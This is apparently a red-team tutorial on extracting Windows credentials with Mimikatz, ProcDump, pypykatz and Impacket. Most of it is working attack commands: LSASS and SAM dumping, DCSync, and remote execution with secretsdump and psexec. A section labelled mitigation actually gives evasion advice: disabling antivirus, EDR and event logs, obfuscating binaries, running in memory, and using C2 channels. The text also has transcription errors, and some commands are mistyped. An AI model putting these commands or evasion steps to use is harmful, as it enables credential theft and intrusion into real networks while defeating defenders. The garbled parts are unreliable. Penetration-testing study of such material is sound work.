MimiKatz is widely used post exploitation tool for extracting credentials from Windows system. Below is the structural guide on how to execute MimiKatz and its alternatives along with various commands used for credential extraction. 

---

### Getting started with MimiKatz.

1. Download and extract MimiKatz

You can download the MimiKatz tool from the following links. 

* [MimiKatz github home](https://github.com/gentilkiwi/mimikatz/)
*  [MimiKatz Github repository](https://github.com/gentilkiwi/mimikatz/releases)
  
To use MimiKatz, follow the following commands. 

```bash
unzip mimikatz_trunk.zip -d mimiKatz
```

```bash
mv -v mimiKatz /opt/
```

```bash
cd /opt/mimiKatz
```

2. Run MimiKatz

To start MimiKatz:

```bash
mimiKatz
```
Two view available options:

```bash
mimiKatz --help
```


---

### Local login commands. 

#### Local login commands pre-requisites. 

Before executing MimiKatz for local logging commands and share, the following prerequisites are met. 

1. **Administrator privileges**
    * MimiKatz Requires elevated permission (administrator or SYSTEM user) to interact with the systems memory and extract credentials. 
    * Without these privileges MimiKatz cannot access sensitive system areas like LSASS, Local Security Authority Subsystem service which stores passwords and token. 

2. **Debug privileges** 
    * Debug privileges are required to access LSASS memory and extract login credentials. 
    * Grant debug privileges with the command. 

```bash
mimikatz # privilege::debug
```

   *  Without debug privileges, MimiKatz cannot perform memory reading or credential extraction actions. 
  
3. **Disable antivirus/EDR software (optional)** 

    * Antivirus or endpoint detection and response(EDR) software. (Example Windows Defender Crowd Strike Sentinel One) May detect and block MimiKatz 
    * To bypass detection. 
      * Disable all bypass antivirus/EDR tools temporarily (if authorized).
      * News obfuscated or custom built version of MimiKatz.

4. **Ensure LSASS protection is disabled** 

    * Modern Windows version have protections to prevent unauthorized access to LSASS memory. 
      * **Credential Guard** : Prevents MimiKatz from interacting with LSASS. 
      * **LSASS protection**  : Prevents reading of LSASS memory by non privileged processes. (Windows 10 v1809+). 

5. **System architecture compatibility **

    * MimiKatz Is available with both 32 bit and 64 bit versions. Use the version that matches your system architecture. 
    * Check the system architecture with the command. 

    ```cmd
    systeminfo | findstr /C:"System Type"
    ```

6. **Run from a trusted location**

    * To Avoid detection as malicious, run MimiKatz from trusted directories like. 

        * ``C:\Windows\System32``
        * ``C:\Users\<user>\Documents``
    * Less restricted locations can help MimiKatz avoid being flagged by security solutions. 

7. **Access to the LSASS process** 

  * MimiKatz Requires access to the LSASS process to extract login credentials. 
  * For remote execution, I'm sure you have administrator access to the target machine to interact with the LSASS process. 
  * Commands like ``sekurlsa::logonpasswords`` depend on accessing LSASS process. 

8. **Network configuration (for remote execution) **

    * If running MimiKatz remotely, ensured network access to the packet machine. 
      * Ensure you can remotely execute program using tools like ``psexec`` or ``WinRM``. 
      * Verify firewall rules. Allow remote execution commands to reach the target machine. 

9. **Reboot system (if required)**

    * Some settings, such as debug privileges may require a system reboot for changes to tech reflect. 
    * And shall you have a plan in place for restarting a system if needed? 

10. **Testing in a controlled environment**

    * Before running MimiKatz in a production environment, test it in a lab environment to verify functionally and prevent potential issues. (Example system instability). 


#### Credential extraction on the local machine. 

1. **Start Mimikatz** from a specific location

```cmd
mimikatz.exe
```

2. **Grant Debug Passwords** to interact with system memory

```cmd
privilege::debug
```

3. **Dump Logon Passwords** from LSASS (Local Security Authority Subsystem Service):

```cmd
sekurlsa::logonpasswords
```

4. **Dump SAM (Security ACccount Manager) Data**:

```cmd
lsadump::sam
```

5. **Patch LSA (Local Security Authority) memory**:

```cmd
lsadump::lsa /patch
```

6. **Execute a Combined Command to extract passwords and save to a file.**

```cmd
./mimikatz.exe "privilege:debug" "sekurlsa::logonpasswords" exit
```

To save output to a file

```cmd
./mimikatz.exe "privilege:debug" "sekurlsa::logonpasswords" exit >>> hash.txt
```

---

### Using LSASS Memory Dumps (lsass.dmp)

if you cannot run Mimikatz directly due to security restrictions, you can dump LSASS memory and analyze it offline.

#### Steps to Dump LSASS Memory.

1. **Download ProcDump from Microsoft Sysinternals.** [procdump](https://learn.microsoft.com/en-us/sysinternals/downloads/procdump)
2. **Dump LSASS Memory for 32-bit system.**

```cmd
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

3. **Dump LSASS Memory for 64-bit systems:**

```cmd
procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp
```

#### Analyzing LSASS Dump with Mimikatz

1. **Load the LSASS Dump into Mimikatz for offline analysis**

```cmd
sekurlsa::minidump lsass.dmp
```

2. **Dump Full Logon Passwords from the Dump:**

```cmd
sekurlsa::logonPasswords full
```

3. **Execute and Save the output to a file**

```cmd
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full" exit >> hash.txt
```

4. **Install Libesedb for parsing ESE Databases**

```cmd
apt install libesedb-utils
```

5. **Use Python Pypykatz for parsing LSASS Dump**

```cmd
pypykatz lsa minidump lsass.DMP
```

---

### Online vs Offline Credential Dumping

#### Online Credential Dumping

1. **Dump SAM Data**:

```cmd
lsadump::sam
```

2. **Grant Debug Privileges**:

```cmd
privilege::debug
```

3. **Get Current Token Info**:

```cmd
token::whoami
```

4. **Elevate Current Token**

```cmd
token::elevate
```

5. **Dump SAM Data Again**:

```cmd
lsadump::sam
```


#### Offline Credential Dumping 

1. **Dump SAM from a specific system**

```cmd
lsadump::sam /system:System /sam:Sam
```

2. **Execute combined Privilege and token Commands**

```cmd
mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords"
```

---


### Detection and Mitigation

Mimikatz Is a powerful tool, but it is also highly detectable by modern security software. To minimize detection, consider the following. 

* **Windows event logs** Event IDS such as 4688 (process creation) and 4624 (successful logon) are logged. 
* **EDR (Endpoint in detection and response)** Tools like Microsoft Defender, ATP, Crowd Strike, and Sentinel One actively detect Mimikatz  
* **LSASS Protection** Credential Guard can prevent direct access to LSASS memory. 

#### Mitigation strategies. 

* **Obfuscate mimikatz** : Use custom builds or obfuscate the Mimikatz binary to bypass detection
* **Run Mimikatz in Memory** Use tools like Powershell, Cobalt Strike or Metasploit to execute Mimikatz in memory by passing disk best detection
* **Disable Defender/EDR.** Disable security solutions like Windows Defender or EDR software temporarily if possible.

---

### Alternatives to Mimikatz

#### Using Impacket for Remote Credential Dumping 

Impacket Alternative tools that can achieve similar results to Mimikatz for credentials extractions. 

1. Extract credentials from LSASS using inpacket's ``secretdump.py``

```cmd
secretsdump.py -just-dc-ntlm DOMAIN/Administrator@TARGET_IP
```

2. Local credential dumping with ``secretdump.py``

```cmd
secretsdump.py -sam TARGET_IP -u Administrator -p Password123
```
3. Execute Mimikatz remotely using impacket's ``psexec.py``

```cmd
psexec.py DOMAIN/Administrator@TARGET_IP -c mimikatz.exe
```

4. Dumb LSASS memory for offline analysis. 

```cmd
procdump -accepteula -ma lsass.exe lsass.dmp
```

Then, transfer the dump file and parse it with Mimikatz

```cmd
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords"
```

5. Dump Active Directory hashes using Impacket(``dcsync``) 

```cmd
wmiexec.py DOMAIN/Administrator@DC_IP "mimikatz.exe 'lsadump::dcsync /domain:DMOAIN.LOCAL /add /csv'"
```

Or Using ``secretsdump.py``


```cmd
secretsdump.py -just-dc DOMAIN/Administrator@DC_IP
```

#### Bypass detection. 

Two bypass detection while using Mimikatz or impacket consider. 

* **Using encrypted C2 channels** tools like Cobalt Strike, Havoc and mythic Provide encrypted command and control channels to evade detection.   
* **Obfuscate Binaries** Use custom or Obfuscate versions of Mimikatz two hour detection. 
* **Disable Windows Defender and event logs.** Temporarily disable security tools and lock services before execution to evade detection. 